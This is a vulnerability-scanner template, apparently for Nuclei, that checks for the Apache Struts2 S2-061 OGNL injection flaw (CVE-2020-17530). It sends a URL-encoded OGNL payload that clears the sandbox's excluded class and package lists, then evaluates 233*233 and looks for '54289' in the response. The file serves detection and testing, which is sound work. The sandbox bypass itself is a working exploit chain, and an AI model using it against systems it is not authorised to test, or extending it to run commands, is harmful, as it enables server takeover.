id: local-struts2-s2-061-ognl-eval

info:
  name: Struts2 S2-061 OGNL Evaluation (CVE-2020-17530)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2.0.0 through 2.5.25 is vulnerable to forced OGNL evaluation
    when evaluated on raw user input in tag attributes, allowing remote code execution.
    S2-061 is a bypass of the S2-059 OGNL sandbox fix.
    This safe POC evaluates a math expression (233*233=54289) without executing commands.
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-061
    - https://nvd.nist.gov/vuln/detail/CVE-2020-17530
  tags: safe-poc,struts2,s2-061,cve,cve2020,ognl,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28233%2A233%29%7D"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "54289"
      - type: status
        status:
          - 200
